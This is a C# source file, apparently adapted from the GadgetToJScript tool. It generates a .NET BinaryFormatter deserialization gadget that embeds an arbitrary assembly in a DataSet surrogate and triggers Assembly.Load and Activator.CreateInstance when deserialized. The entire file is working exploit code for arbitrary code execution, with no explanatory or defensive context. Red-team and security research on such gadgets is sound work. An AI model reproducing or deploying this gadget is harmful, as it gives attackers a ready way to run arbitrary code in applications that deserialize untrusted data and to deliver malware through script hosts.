//Based on https://github.com/med0x2e/GadgetToJScript/blob/master/GadgetToJScript/_ASurrogateGadgetGenerator.cs

using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel.Design;
using System.Data;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Web.UI.WebControls;

namespace GadgetToJScript
{
	[Serializable]
	public class SurrogateGadgetGenerator : ISerializable
	{
		protected byte[] assemblyBytes;

		public SurrogateGadgetGenerator(Assembly assembly)
		{
			assemblyBytes = File.ReadAllBytes(assembly.Location);
		}

		public void GetObjectData(SerializationInfo info, StreamingContext context)
		{
			try
			{
				List<byte[]> bytes = new List<byte[]> { assemblyBytes };
				var d1 = bytes.Select(Assembly.Load);
				Func<Assembly, IEnumerable<Type>> types = (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes"));
				var d2 = d1.SelectMany(types);
				var d3 = d2.Select(Activator.CreateInstance);
				PagedDataSource pds = new PagedDataSource() { DataSource = d3 };
				IDictionary dictionary = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);
				DesignerVerb dv = new DesignerVerb("", null);
				typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(dv, dictionary);
				List<object> objects = new List<object>();
				objects.Add(d1);
				objects.Add(d2);
				objects.Add(d3);
				objects.Add(pds);
				objects.Add(dv);
				objects.Add(dictionary);
				Hashtable ht = new Hashtable();
				ht.Add(dv, "v1");
				ht.Add("p2", "v2");
				FieldInfo fiBuckets = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
				Array buckets = (Array)fiBuckets.GetValue(ht);
				FieldInfo fiKey = buckets.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);

				for (int i = 0; i < buckets.Length; ++i)
				{
					object bucket = buckets.GetValue(i);
					object key = fiKey.GetValue(bucket);

					if (key is string)
					{
						fiKey.SetValue(bucket, dv);
						buckets.SetValue(bucket, i);
						break;
					}
				}

				fiBuckets.SetValue(ht, buckets);
				objects.Add(ht);
				info.SetType(typeof(DataSet));
				info.AddValue("DataSet.RemotingFormat", SerializationFormat.Binary);
				info.AddValue("DataSet.DataSetName", "");
				info.AddValue("DataSet.Namespace", "");
				info.AddValue("DataSet.Prefix", "");
				info.AddValue("DataSet.CaseSensitive", false);
				info.AddValue("DataSet.LocaleLCID", 0x409);
				info.AddValue("DataSet.EnforceConstraints", false);
				info.AddValue("DataSet.ExtendedProperties", null);
				info.AddValue("DataSet.Tables.Count", 1);
				BinaryFormatter bf = new BinaryFormatter();
				MemoryStream ms = new MemoryStream();
				bf.SurrogateSelector = new SurrogateSelector();
				bf.Serialize(ms, objects);
				info.AddValue("DataSet.Tables_0", ms.ToArray());
			}

			catch (Exception) { }
		}
	}
}
